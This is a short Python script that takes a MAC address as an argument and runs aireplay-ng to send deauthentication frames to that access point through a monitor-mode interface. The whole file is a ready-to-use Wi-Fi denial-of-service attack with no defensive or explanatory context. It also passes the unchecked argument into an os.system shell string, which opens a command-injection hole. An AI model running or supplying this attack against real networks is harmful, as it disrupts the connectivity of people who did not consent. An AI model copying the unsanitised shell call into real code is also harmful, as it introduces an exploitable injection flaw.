import os
import sys

mac = sys.argv[1]
os.system("sudo aireplay-ng --deauth 5 -a {} wlan1mon".format(mac))
